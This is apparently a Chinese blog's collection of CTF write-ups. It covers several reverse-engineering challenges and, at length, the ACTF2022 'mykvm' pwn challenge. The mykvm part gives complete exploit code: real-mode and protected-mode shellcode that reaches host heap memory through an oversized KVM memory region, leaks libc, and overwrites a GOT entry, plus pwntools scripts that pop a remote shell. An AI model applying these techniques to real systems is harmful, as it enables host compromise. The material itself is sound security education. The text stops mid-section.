std::operator==<char>(v7, \"ms4otszPhcr7tMmzGMkHyFn=\");\n  std::string::~string((std::string *)v7);\n  std::string::~string((std::string *)v6);\n  if ( v3 )\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Good boy! Submit your flag :)\");\n  else\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Too bad :(\");\n  std::string::~string((std::string *)v5);\n  return 0;\n}\n```\n\nexp如下：\n\n```python\na = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"\nb = \"ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv=\"\nb_str = \"ms4otszPhcr7tMmzGMkHyFn=\"\ndict1 = {}\n\nfor i in range(len(a)):\n    dict1[b[i]] = a[i]\nprint(dict1)\n\nfor j in b_str:\n    print(dict1[j],end=\"\")\n\nprint(\"\\n\")\n```\n\n得到 `RnVubnlfZW5jb2RlX2h1aCE=` ，再base64解码：\n\n```bash\n$ echo RnVubnlfZW5jb2RlX2h1aCE= | base64 -d\nFunny_encode_huh!\n```\n\n\n\n# flag_finder\n\n附件：[flag_finder.zip](flag_finder.zip)\n\n> 下断点调试\n\nmain函数如下\n\n```c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  __int64 result; // rax\n  void *v4; // rsp\n  unsigned int v5; // ebx\n  char v6; // r13\n  char **v7; // [rsp+0h] [rbp-50h] BYREF\n  int v8; // [rsp+Ch] [rbp-44h]\n  unsigned int v9; // [rsp+18h] [rbp-38h]\n  int v10; // [rsp+1Ch] [rbp-34h]\n  __int64 v11; // [rsp+20h] [rbp-30h]\n  char *dest; // [rsp+28h] [rbp-28h]\n\n  v8 = a1;\n  v7 = a2;\n  if ( a1 == 2 )\n  {\n    v11 = (unsigned int)n - 1LL;\n    v4 = alloca(16 * (((unsigned __int64)(unsigned int)n + 15) / 0x10));\n    dest = (char *)&v7;\n    strcpy((char *)&v7, a2j);\n    v10 = 0;\n    v9 = 0;\n    while ( memcmp(dest, \"9447\", 4uLL) )\n    {\n      v5 = v9 % (unsigned int)n;\n      v6 = dest[v9 % (unsigned int)n];\n      dest[v5] = sub_40060D() ^ v6;\n      ++v9;\n    }\n    if ( !memcmp(dest, v7[1], (unsigned int)n) )\n      printf(\"The flag is %s\\n\", v7[1]);\n    else\n      puts(\"Try again\");\n    result = 0LL;\n  }\n  else\n  {\n    printf(\"Usage: %s <password>\\n\", *v7);\n    result = 1LL;\n  }\n  return result;\n}\n```\n\nv7[1] 是我们输入的字符串，因此再`memcmp(dest, v7[1], (unsigned int)n)`处下断点即可看到dest中存放的字符串（即flag）：\n\n```\npwndbg> set arg aaaa\npwndbg> b *0x400729\npwndbg> r\n────────────────────────────────────────[ DISASM ]──────────────────────────────────────────\n ► 0x400729    call   memcmp@plt <memcmp@plt>\n        s1: 0x7fffffffdc10 ◂— '9447{C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_re4l__H4LT1N6_prObL3M}'\n        s2: 0x7fffffffe154 ◂— 0x4548530061616161 /* 'aaaa' */\n        n: 0x46\n```\n\n得到flag：`9447{C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_re4l__H4LT1N6_prObL3M}`\n\n\n\n# debug_me\n\n附件：[debug_me.zip](debug_me.zip)\n\n> 反调试\n\nmain函数中将我们的输入传给 `sub_4006FD()` 函数处理。此时有两个方法：1）直接在for循环中下断点，查看每次执行时 `*(char *)(v3[i % 3] + 2 * (i / 3))` 的结果，将每个数减1就得到flag。2）重写这个函数，编译跑一遍。\n\n```c\n__int64 __fastcall sub_4006FD(__int64 a1)\n{\n  int i; // [rsp+14h] [rbp-24h]\n  __int64 v3[4]; // [rsp+18h] [rbp-20h]\n\n  v3[0] = (__int64)\"Dufhbmf\";\n  v3[1] = (__int64)\"pG`imos\";\n  v3[2] = (__int64)\"ewUglpt\";\n  for ( i = 0; i <= 11; ++i )\n  {\n    if ( *(char *)(v3[i % 3] + 2 * (i / 3)) - *(char *)(i + a1) != 1 )\n      return 1LL;\n  }\n  return 0LL;\n}\n```\n\n**方法1**\n\ngdb调试时发现程序无法正常运行，ctrl-c 后可以看到，程序在0x4007e4处进入了循环。（另一种方法，在`gdb r`命令前，使用 `catch syscall` 对每一个系统调用下断点，也能跟踪到ptrace调用点）\n\n```\n──────────────────────────────────────[ DISASM ]─────────────────────────────────────────────\n ► 0x4007e4    jmp    0x4007e4 <0x4007e4>\n    ↓\n   0x4007e4    jmp    0x4007e4 <0x4007e4>\n```\n\n对应到二进制的 `sub_4007A8()` 函数，该二进制开启了反调试\n\n```c\n__int64 sub_4007A8()\n{\n  __int64 result; // rax\n\n  if ( (unsigned int)getenv(\"LD_PRELOAD\") )\t\t\t// 防注入\n  {\n    while ( 1 )\n      ;\n  }\n  result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL);\t\t// 反调试\n  if ( result < 0 )\n  {\n    while ( 1 )\n      ;\n  }\n  return result;\n}\n```\n\n这个题比较简单，虽然开了反调试，但我们可以在调用 `sub_4007A8()` 函数之前下断点，gdb中修改内存或寄存器值，绕过检测，然后进入 `sub_4006FD()` 函数查看字符串计算结果，得到flag。\n\n```c\nvoid __fastcall init(unsigned int a1, __int64 a2, __int64 a3)\n{\n  __int64 v4; // rbx\n  signed __int64 v5; // rbp\n\n  v4 = 0LL;\n  v5 = &off_600E18 - funcs_4008D9;\n  init_proc();\n  if ( v5 )\t\t\t\t// 在这之前将v5设置成0\n  {\n    do\n      ((void (__fastcall *)(_QWORD, __int64, __int64))funcs_4008D9[v4++])(a1, a2, a3);\n    while ( v4 != v5 );\n  }\n}\n```\n\n\n\n**方法2**\n\nexp如下：\n\n```c\n#include<stdio.h>\n#include<stdint.h>\n\nint main(){\n\n    uint64_t v3[3];\n    v3[0] = (uint64_t)\"Dufhbmf\";\n    v3[1] = (uint64_t)\"pG`imos\";\n    v3[2] = (uint64_t)\"ewUglpt\";\n\n    int i = 0,a =0;\n    for(i = 0; i <= 11; i++){\n        a = *(char *)(v3[i%3] + 2 *(i/3));\n        printf(\"0x%x, \",a-1);\n        printf(\"%c, \",a-1);\n    }\n\n  return 0;\n}\n// Code_Talkers\n```\n\n# float\n\n附件：[float.zip](float.zip)\n\n【暂未解出】\n可参考WP：[强网杯2021 ctf线上赛ezmath wp](https://www.dounaite.com/article/627d7e86ac359fc9132eee31.html)\n\n\n本题的主要计算步骤在sub_13f3函数中，v3的初始值为0.2021，i的起始值为0x2021，乍一看`v3 = 2.718281828459045 - (double)i * v3` 的计算结果会小于0。而main函数中待比对的结果`dbl_4020数组`中值都是大于0的浮点数。所以这里的计算很奇怪，加上init_array中有一个奇怪的计算函数，所以我们动态调试来看看v3这个位置的实际情况。调试结果如下图所示，v3的初始值是0.00048291080524950886，并不是我们之前分析的0.2021。\n\n![actaul_v3](20220707181436.png?size=600)\n\n\n\n## python：16进制与double/float之间的转换\n\n[Python 十六进制与浮点数互相转换](https://blog.csdn.net/lwaif/article/details/53335191)\n\n[python中struct.pack()函数和struct.unpack()函数](https://www.cnblogs.com/litaozijin/p/6506354.html)\n\n转换示例代码\n\n```python\nimport struct\n\nnum_hex = 0x3f19ad3fbd59ca39\nnum_double = 0.00009794904266317233\n\n# hex to double\nnum_hex_str = '{:x}'.format(num_hex)    # 将数转成hex string - '3f19ad3fbd59ca39'\nresult_double = struct.unpack('>d',bytes.fromhex(num_hex_str))[0]       # 将hex string转成double型数 \nprint(\"double is : {}\".format(result_double))\n\n# double to hex\nresult_hex_str = struct.pack(\">d\",num_double).hex()   # 将double转成hex string\nresult_int = int(result_hex_str,16)       # hex string转成数\nprint(\"hex is : 0x{:x}\".format(result_int))\n```\n\n\n\n\n## sympy库：解数学方程\n\n[rMath-浮点运算的逆向分析](http://spd.dropsec.xyz/2017/03/30/rMath-%E6%B5%AE%E7%82%B9%E8%BF%90%E7%AE%97%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/)\n\n一个例子，假设要计算以下式子中x的值：\n\n```\n2.718281828459045 - x*0.00048291080524950886 = 0.00009794904266317233\n```\n\n那么可以利用如下脚本\n\n```python\nimport struct\nfrom sympy import *\n\nStr = symbols('Str')\n\njie = solve(2.718281828459045 - Str*0.00048291080524950886 - 0.00009794904266317233,Str)\n\nret = struct.pack(\">f\",jie[0]).hex()\n\nprint(ret)\n```\n\n\nIDA使用小技巧——将数据转换成double类型的操作：\n\n![ida_to_double](20220707175957.png?size=600)\n\n\n\n\n# simulator\n\n附件：[simulator.zip](simulator.zip)\n\n\n\n\n\n# GoodRE\n\n附件：[GoodRE.zip](GoodRE.zip)\n\n\n\n\n\n# SimpleFileSytem\n\n附件：[SimpleFileSystem.zip](SimpleFileSystem.zip)\n\n\n\n# SoMuchCode\n\n附件：[SoMuchCode.zip](SoMuchCode.zip)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["reverse"],"categories":["CTF"]},{"title":"ACTF2022 pwn mykvm题解","url":"/2022/07/01/ACTF2022-pwn-mykvm/","content":"\n\n\n- 题目描述：KVM is funny, enjoy it!\n- 题目附件：[mykvm.zip](mykvm.zip)\n\n# 分析\n\n先看一下main函数中的代码逻辑，\n\n```c\n   puts(\"your code size: \");\t\t\t//待输入code的大小\n    __isoc99_scanf(\"%d\", nbytes);\n    if ( nbytes[0] <= 0x1000 )\n    {\n      puts(\"your code: \");\t\t\t//输入准备好的code，将在kvm虚拟机中运行\n      read(0, buf, nbytes[0]);\n      *(_QWORD *)&nbytes[1] = sub_400F28((__int64)\"guest name: \");\t\t\n      *(_QWORD *)&nbytes[1] = sub_400F28((__int64)\"guest passwd: \");\t\n      sub_400B92(buf, nbytes[0]);\t\t\t//函数内部通过ioctl调用实现kvm虚拟机执行上面输入的code并返回\n      *(_QWORD *)&nbytes[1] = sub_400F28((__int64)\"host name: \");\t\t\n      memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);\t\n      puts(\"Bye!\");\n```\n\n做题之前并没有研究过KVM的机制，于是搜了一下跟kvm相关的ctf题，发现了这一篇：[Confidence2020 CTF KVM](https://www.anquanke.com/post/id/254790)。按照这个题目中的漏洞点，很快在mykvm中也找到了类似漏洞。如下，sub_400B92()函数中memory_size的值设置的相当大，于是我们能在kvm虚拟机中越界访问到host机的内存。\n\n```c\n  v8.slot = 0;\n  v8.flags = 0;\n  v8.guest_phys_addr = 0LL;\n  v8.memory_size = 0x40000000LL;\n  v8.userspace_addr = (int)((_DWORD)&unk_602100\n                          - (((((unsigned int)((int)&unk_602100 >> 31) >> 20) + (unsigned __int16)&unk_602100) & 0xFFF)\n                           - ((unsigned int)((int)&unk_602100 >> 31) >> 20))\n                          + 4096);\n  ioctl(v4, 0x4020AE46uLL, &v8);\n```\n\n不过，unk_602100在bss段，在kvm虚拟机中我们只能往后访问，即可能访问到host进程的堆空间。同时，该题对kvm虚拟机的设置，要求我们的代码从实模式开始运行。因此，要么我们在实模式有限的访存空间（1M）下进行利用，要么想办法进入保护模式进行利用。\n\n由于对实模式和保护模式的切换以及页表的设置不熟，且堆的地址范围在一定概率下会跟kvm能访问的空间（1M）有重合，于是我们就直接在实模式下完成了对该题的利用。\n\n\n\n## 越界能做什么？\n\n首先，在bss段的最后，有一个指针变量，是`memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);`的目的地址，也就是说我们能写host进程空间的任意地址，长度为0x20。\n\n```\n.bss:0000000000602100 unk_602100      db    ? ;               ; DATA XREF: sub_400B92+8C↑o\n.bss:0000000000602100                                         ; sub_400B92+93↑o\n.bss:0000000000602101                 db    ? ;\n.bss:0000000000602102                 db    ? ;\n.bss:0000000000602103                 db    ? ;\n.bss:0000000000602104                 db    ? ;\n.............\n.bss:000000000060A100 ; void *dest\n.bss:000000000060A100 dest            dq ?                    ; DATA XREF: main+7E↑w\n.bss:000000000060A100                                         ; main+85↑r ...\n.bss:000000000060A100 _bss            ends\n```\n\n然后，再往后写就是host进程的堆空间了，这部分需要动态调试查看其内容，找到对我们有用的部分。\n\n（调试过程省略，该环境使用的lib版本较低，是libc2.23，存在fastbin）\n\n- 在堆空间中有一些libc的地址，利用这个可以在code中计算libc基址。\n\n- 我发现，如果\"guest name: \"，\"guest passwd: \"和\"host name: \"都输入相同长度字符串\"xxxx\"时，三者分配的是同一个chunk。且chunk的后8个字节存着一个固定的libc地址。\n\n\n\n## 错位写入\n\n通过以上分析，我们具备了如下能力：\n\n- 任意地址写（目的地址可控，写入内容可控，长度为0x20）\n\n- 已知libc基址\n\n所以，我们可以覆写host进程的got表，将`puts(\"Bye!\")`打印劫持成执行一段gadget。\n\n但是，由于`memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);`中nbytes[1]的第一个字节一定会被我们的输入覆盖，所以如果将dest地址改成puts@got的话，无法写成目标gadget地址。幸好我们能写0x20大小的内容，因此通过错位写入，就能达到目的。\n\nps. 由于泄露的libc地址是保存在shellcode的执行环境中的，并未泄露给我们，因此需要在我们的shellcode中将gadget地址写到nbytes[1]对应的堆块中。这样也能达到hook got表项的目的。\n\n## 其他\n\n做题过程中发现的一些认为重要的点。\n\n### buf未初始化\n\nmain函数中的buf没有初始化，所以我们将`\"your code size: `\"的大小设置为最大值4096时，栈中残留数据会被带入我们运行的kvm虚拟机可访问空间内。这里面存在libc相关的地址，也是泄露libc基址的一种方法。\n\n```c\n __int64 result; // rax\n  _DWORD nbytes[3]; // [rsp+4h] [rbp-101Ch] BYREF\n  char buf[4104]; // [rsp+10h] [rbp-1010h] BYREF\n  unsigned __int64 v6; // [rsp+1018h] [rbp-8h]\n.......\n    puts(\"your code size: \");\n    __isoc99_scanf(\"%d\", nbytes);\n    if ( nbytes[0] <= 0x1000 )\n    {\n      puts(\"your code: \");\n      read(0, buf, nbytes[0]);\n........\n```\n\n\n\n### readline是什么\n\nsub_400F28()这个函数被调用了三次，两次在kvm执行代码前，一次在kvm执行代码后。这个函数中使用了readline，关于这个函数，简单解释如下。\n\n> readline() 的参数是一个字符串，调用函数的时候会在屏幕上输出，这个函数会读取一行输入，然后返回一个指向输入字符串的指针，readline 会为输入的字符串动态分配内存，所以使用完之后需要free掉。——来自[readline库的简单使用](https://blog.51cto.com/u_3078781/3287226)\n\n```c\nvoid *__fastcall sub_400F28(__int64 a1)\n{\n  if ( ptr )\n  {\n    free(ptr);\n    ptr = 0LL;\n  }\n  ptr = (void *)readline(a1);\n  if ( ptr && *(_BYTE *)ptr )\n    add_history((__int64)ptr);\n  return ptr;\n}\n```\n\n所以这里会使用堆，且堆的大小和内容，我们可控。\n\n\n\n# 调试\n\n注意点：\n\n- host需要开启kvm支持\n- docker container启动命令需要加`--privileged`，使docker中能调用到对应的功能\n\n```bash\ndocker container run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest\ndocker container exec -it <container-ID> /bin/bash\n# 本地发起一个连接并停住（raw_input(), input()）\ngdb server :1234 --attach <pid>\n# 本地起gdb连接（target remote :1234）\n```\n\n\n\n# 利用\n\n\n\n## shellcode编写\n\n汇编代码详细解释\n\n```assembly\n    .code16gcc\t\t\t; 指明编译的程序是运行在16位x86实模式下的\n    jmp main\t\t\t; 跳转到main处开始运行\n    .rept 40\n    .byte 0x00\n    .endr\t\t\t\t; 这三条是为了适配gadget的条件[rsp+0x30]==null而准备的\nmain:\n    mov eax,[0x7100]\n    sub eax,0x603000\n    cmp eax,0xfd800\t\t; 从0x7100（0x60a100）处读取dest中存放的堆地址，判断目标读写堆地址是否在1M空间内\n    jb next\t\t\t\t; 在1M范围内就进入next继续利用\n    mov ebx,0\n    div eax,ebx\t\t\t; 不在1M范围内则通过除零异常重新开始\n\nnext:\n    mov ebx,[0x568]\t\t; 由于buf未初始化，当采用0x1000最大长度拷贝时，可以将栈中的地址信息拷贝到kvm虚拟机可访问的内存中，0x568处存放了一个有用地址，通过偏移可以准确计算libc基址\n    add ebx,0x2270cf\n    mov [0x7200],ebx\t; libc基址的低32位保存在0x7200处\n    mov ebx,[0x56c]\n    mov [0x7204],ebx   \t; libc基址的高32位保存在0x7204处\n\n    mov ebx,[0x7100]\t\n    add ebx,0x27e0\n    mov [0x7220],ebx\t; 将目标heap chunk的地址存到0x7220处\n\n    mov edx,[0x7200]\n    add edx,0x4527a\t\t\n    push edx\t\t\t; 计算gadget低4字节的实际地址，暂时保存在栈上\n    add ebx,0x8\t\t\t; 目标heap chunk是0x10字节大小的，前8个字节在readline()时会被覆盖，所以这里使用后8个字节存放gadget的地址\n    sub ebx,0x603000\t; 换算成kvm虚拟机中可以访问的地址\n    mov eax,ebx\n    shr eax,16\n    shl eax,12\n    mov ds,eax\t\t\t; 由于目标地址有20位，而x86实模式下地址总线只有16位，因此需要借助ds寄存器实现访存操作。\n    pop edx\n    mov ds:[bx],edx\t\t; 把gadget的低4个字节拷贝到了目标堆块对应位置，由于堆块中正好有libc的高4字节信息，省了一次拷贝操作\n\n    mov ebx,0x602020\n    mov eax,0\t\t\t; 将ds寄存器清空，因为接下来要访问的地址不超过16位\n    mov ds,eax\n    mov [0x7100],ebx\t; 将dest存放的内容改成got表项（putchar）地址，以达到错位将puts的got表项改成了gadget地址的目的\n\n    hlt\t\t\t\t\t; hlt指令跟除零异常的返回不一样，便于在python脚本中区分\n```\n\n在写shellcode时，由于对x86实模式下的汇编规则不熟，遇到些坑点。如：\n\n- eax用于访存和add指令相关的操作时无法正常工作\n- ds寄存器的设置与取消\n- edx中存放的值间隔几条指令后可能被清零，而ebx不会\n\n\n\n## exp\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"20.247.110.192\",10888)\nio = remote(\"127.0.0.1\",8000)\n\nshellcode = asm('''\n    .code16gcc\n    jmp main\n    .byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n\nmain:\n    mov eax,[0x7100]\n    sub eax,0x603000\n    cmp eax,0xfd800\n    jb next\n    mov ebx,0\n    div eax,ebx\n\nnext:\n    mov ebx,[0x568]\n    add ebx,0x2270cf\n    mov [0x7200],ebx\n    mov ebx,[0x56c]\n    mov [0x7204],ebx   \n\n    mov ebx,[0x7100]\n    add ebx,0x27e0\n    mov [0x7220],ebx\t\n\n    mov edx,[0x7200]\n    add edx,0x4527a\n    mov [0x7228],edx\n    push edx\n    add ebx,0x8\n    sub ebx,0x603000\n    mov eax,ebx\n    shr eax,16\n    shl eax,12\n    mov ds,eax\n    pop edx\n    mov ds:[bx],edx\n\n    mov ebx,0x602020\n    mov eax,0\n    mov ds,eax\n    mov [0x7100],ebx\n\n    hlt\n''')\n\nc = 1 \nwhile c:\n    #raw_input()    \n    io.recvuntil(\"your code size: \")\n    io.sendline('4096')\n\n    io.recvuntil(\"your code: \")\n    io.sendline(shellcode)\n\n    io.recvuntil(\"guest name: \")\n    io.sendline('bbbb')\n\n    io.recvuntil(\"guest passwd: \")\n    io.sendline('cccc')\n\n    io.recvline()\n    ret = io.recv(0x1b)\n    if \"mykvm\" not in ret:\n        c = 0\n        print(\"got it!!!\")\n        #raw_input()\n        io.sendline(\"dddd\")\n    \t# io.recvuntil(\"host name: \")\n\t\t# io.sendline('dddd')\n        break\n         \n    # except:\n    io.close()\n    io = remote(\"127.0.0.1\",8000)\n    # io = remote(\"20.247.110.192\",10888)\n\nio.interactive()\n```\n\n\n\n## 精简版exp\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"20.247.110.192\",10888)\nio = remote(\"127.0.0.1\",8000)\n\nshellcode = asm('''\n    .code16gcc\n    jmp main\n    .rept 40\n    .byte 0x00\n    .endr\t\t\t\t# 为gadget environ为null做准备\nmain:\n    mov eax,[0x7100]\n    sub eax,0x603000\n    cmp eax,0xfd800\n    jb next\n    mov ebx,0\n    div eax,ebx      \t # 暴破出能访问的堆地址（1M以内）\n\nnext:\n    mov ebx,[0x568]\n    add ebx,0x2270cf\n\tadd ebx,0x4527a\n    push ebx\t\t\t# 保存gadget实际地址的低4字节\n\t\n    mov ebx,[0x7100]\n    add ebx,0x27e0\t\t# 目标heap chunk，即memcpy(dest, *(const void **)&nbytes[1], 0x20uLL);的第二个参数\n\n\tmov ecx,0x602020\n    mov [0x7100],ecx\t# 将memcpy第一个参数替换成got表地址\n\n    add ebx,0x8\n    sub ebx,0x603000\n    mov eax,ebx\n    shr eax,16\n    shl eax,12\n    mov ds,eax\n    pop edx\n    mov ds:[bx],edx\t\t# 将gadget地址写入目标heap chunk\n\n    hlt\t\t\t\t\t# hlt，区分div 0，暴破\n''')\n\nc = 1 \nwhile c:\n    io.sendlineafter(\"your code size: \",'4096')\n    io.sendlineafter(\"your code: \",shellcode)\n    io.sendlineafter(\"guest name: \",'bbbb')\n    io.sendlineafter(\"guest passwd: \",'cccc')\n\n    io.recvline()\n    ret = io.recv(0x1b)\n    if \"mykvm\" not in ret:\n        c = 0\n        print(\"got it!!!\")\n        io.sendline(\"dddd\")\n        break\n      \n    io.close()\n    io = remote(\"127.0.0.1\",8000)\n    # io = remote(\"20.247.110.192\",10888)\n\nio.interactive()\n```\n\n\n\n# 续：进入实模式的利用\n\n[官方WP](https://github.com/team-s2/ACTF-2022/blob/main/pwn/mykvm/exploits/exp.py)\n\n官方的方法是通过进入保护模式，使shellcode能访问到更多的内存，然后泄露libc地址，最后写got表及dest(\"/bin/sh\")，达到执行`system(\"/bin/sh\")`的目的。（应该是出于gadget有environ的限制，所以未使用gadget直接get shell）\n\n## 从实模式进入保护模式\n\n关于如何从16位实模式进入32位保护模式，可以参考这篇文章—— [[原创]16位实模式切换32位保护模式过程详解](https://bbs.pediy.com/thread-269223.htm).\n\n\n从实模式进入32位保护模式需要完成如下几件事情：\n1. 屏蔽中断\n2. 初始化全局描述符表（GDT）\n3. 将CR0寄存器最低位置1\n4. 执行远跳转\n5. 初始化段寄存器和栈指针\n\n以下汇编代码便是完成上述功能的一个框架，可以根据需求在 `; your function code` 处编写在保护模式下运行的代码。\n\n```assembly\norg 0 \ncli                     \n\nlgdt [gdt_descriptor]   \n\nmov eax, cr0\nor eax, 0x1\nmov cr0, eax\njmp 08h:PModeMain\n \n[bits 32]\nPModeMain:\n    mov ax, 0x10       \n    mov ds, ax         \n    mov es, ax\n    mov fs, ax         \n    mov gs, ax\n    mov ax, 0x18      \n    mov ss, ax\n    mov ebp, 0x7c00    \n    mov esp, ebp\n\n                                ; your function code \n    \n    hlt\n\ngdt_start:\ngdt_null:\n    dd 0\n    dd 0\ngdt_code:\n    dw 0xffff ; Limit (bits 0-15)\n    dw 0x0 ; Base (bits 0-15)\n    db 0x0 ; Base (bits 16-23)\n    db 10011010b ; Access Byte\n    db 11001111b ; Flags , Limit (bits 16-19)\n    db 0x0 ; Base (bits 24-31)\ngdt_data:\n    dw 0xffff ; Limit (bits 0-15)\n    dw 0x0 ; Base (bits 0-15)\n    db 0x0 ; Base (bits 16-23)\n    db 10010010b ; Access Byte\n    db 11001111b ; Flags , Limit (bits 16-19)\n    db 0x0 ; Base (bits 24-31)\ngdt_stack:\n    dw 0x7c00 ; Limit (bits 0-15)\n    dw 0x0 ; Base (bits 0-15)\n    db 0x0 ; Base (bits 16-23)\n    db 10010010b ; Access Byte\n    db 01000000b ; Flags , Limit (bits 16-19)\n    db 0x0 ; Base (bits 24-31)\ngdt_end:\n \ngdt_descriptor:\ndw gdt_end - gdt_start - 1 \ndd gdt_start\n```\n### 尝试写写\n\n以本题为例，我们尝试写堆空间（超过1M访存），如下是功能代码：\n\n```assembly\n\tmov eax, [0x7100] \n    sub eax, 0x603000\n\tmov dword [eax], 0x52525252\n```\n\n编译命令：\n\n```bash\nnasm test.asm -o test.bin\n```\n\n脚本中加载读取test.bin的汇编内容\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",8000)\n\nwith open(\"./test.bin\", \"rb\") as f:\n    shellcode = f.read()\n\nraw_input()     # for debug\n\nio.sendlineafter(\"your code size: \",str(len(shellcode)))\nio.sendafter(\"your code: \",shellcode)\nio.sendlineafter(\"guest name: \",\"a\"*0x4)\nio.sendlineafter(\"guest passwd: \",\"b\"*0x4)\nio.sendlineafter(\"host name: \",\"c\"*0x4)\n\nio.interactive()\n```\n\n结果如下，对应的堆地址处被写为`52 52 52 52`，且`hex(0x1c05010-0x603000) = 0x1602010`距离超过1M。说明此时在32位保护模式下，我们能直接访存的空间更大了。\n\n```\ngef➤  heap chunks\nChunk(addr=0x1c05010, size=0x30, flags=PREV_INUSE)\n    [0x0000000001c05010     52 52 52 52 00 00 00 00 00 00 00 00 00 00 00 00    RRRR............]\nChunk(addr=0x1c05040, size=0x20, flags=PREV_INUSE)\n    [0x0000000001c05040     67 75 65 73 74 20 70 61 73 73 77 64 3a 20 00 00    guest passwd: ..]\n```\n\n\n### 保护模式下的利用\n\n进入保护模式后，由于访存能力更强，我们可以省略暴破的环节，同时不用栈中的libc地址了，而是直接取堆空间中存在的libc地址\n\n```\n; ......\n%rep 50\ndb 0x00\n%endrep\n\n[bits 32]\nPModeMain:\n; ......\n\n    mov ebx, [0x7100]\n    add ebx, 0x1b48\n    sub ebx, 0x603000\n    mov edx, [ebx]\t\t\n    sub edx, 0x3c51a8\t\n    add edx, 0x4527a\t; gadget addr\n        \n    push edx\n        \n    mov ebx, [0x7100]\n    add ebx, 0x27e0\t\t; target &nbytes addr\n    add ebx, 0x8\n    sub ebx, 0x603000\t; memcpy arg1 -> &nbytes\n\n    pop edx\n    mov [ebx], edx      ; gadget to &nbytes\n\n    mov ecx, 0x602020\n    mov [0x7100],ecx        ; memcpy arg0 -> 0x602020\n```\n\n将以上汇编合入框架中，编译成test.bin，攻击脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\n# io = remote(\"20.247.110.192\",10888)\nio = remote(\"127.0.0.1\",8000)\n\nwith open(\"./test.bin\", \"rb\") as f:\n    shellcode = f.read()\n\nraw_input()     ; for debug\n\nio.sendlineafter(\"your code size: \",str(len(shellcode)))\nio.sendafter(\"your code: \",shellcode)\nio.sendlineafter(\"guest name: \",\"a\"*0x4)\nio.sendlineafter(\"guest passwd: \",\"b\"*0x4)\nio.sendlineafter(\"host name: \",\"c\"*0x4)\n\nio.interactive()\n```\n\n可成功获取shell。\n\n汇编那一段，可以更简化，CS和DS段是必须的，其他段可以删除。见[test.asm](test.asm)。\n\n## kvm跟host的交互\n\n> in/out指令，官方WP中利用这个指令泄露libc地址，我的方法中未使用\n\n[汇编语言中OUT和IN的用法](https://blog.csdn.net/qq_22642239/article/details/70140859)\n\n[【asm基础】汇编指令之in/out指令](https://blog.csdn.net/jiangwei0512/article/details/50611778)\n\n[【KVM】KVM学习—实现自己的内核](https://www.jianshu.com/p/5ec4507e9be0)\n\n本题中，利用`out`指令返回一个字符`\"W\"`，脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",8000)\n\nshellcode = asm('''\n    .code16\n    mov al, 0x57\n    mov dx, 0x217\n    out dx, al\n    mov al, 10\n    out dx, al\n    hlt\n''')\nprint(type(out1))   # str\nprint(out1)\nprint(repr(out1))   # \"\\xB0\\x57\\xBA\\x17\\x02\\xEE\\xB0\\n\\xEE\\xF4\"\n# repr()方法可以将读取到的格式字符，比如换行符、制表符，转化为其相应的转义字符\n\nio.sendlineafter(\"your code size: \",str(len(shellcode)))\nio.sendafter(\"your code: \",shellcode)\nio.sendlineafter(\"guest name: \",\"a\"*0x4)\nio.sendlineafter(\"guest passwd: \",\"b\"*0x4)\nio.sendlineafter(\"host name: \",\"c\"*0x4)\n\nio.interactive()\n```\n\ndebug信息证明在保护模式下成功执行了shellcode\n\n```\n[DEBUG] Received 0x1e bytes:\n    'bbb\\n'\n    'W\\n'\n    'KVM_EXIT_HLT\\n'\n    'host name: '\n```\n\n# 续：什么是实模式和保护模式\n\nx86下，系统上电经过bios自检后进入实模式。\n\n>  实模式下采用段寻址方式，可直接访问物理地址。此时的通用寄存器位宽只有16bit，借助段寄存器（cs，ds，ss，es）可将寻址能力扩展至1M范围。（linear address = segment << 4 + offset）\n\n[实模式、保护模式、三种地址、分段、分页](https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html)\n\n实模式显然无法满足计算机日渐增长的访存需求，于是出现了保护模式。不仅扩展了访存能力，同时也提高了安全性。\n\n保护模式中引入分段和分页的概念。\n\n逻辑地址 --[分段]--》 线性地址 --[分页]--》 物理地址\n\n- 分段\n\n[x86段寄存器和分段机制](https://zhuanlan.zhihu.com/p/324210723)\n\n画了一张表，理清了段选择子，GDTR，GDT之间的关系。（注意：这张图是针对x86 32位架构的。x86 64架构下，GDTR中基地址是64位）\n\n![image-20220706165811870](image-20220706165811870.png?size=600)\n\n- 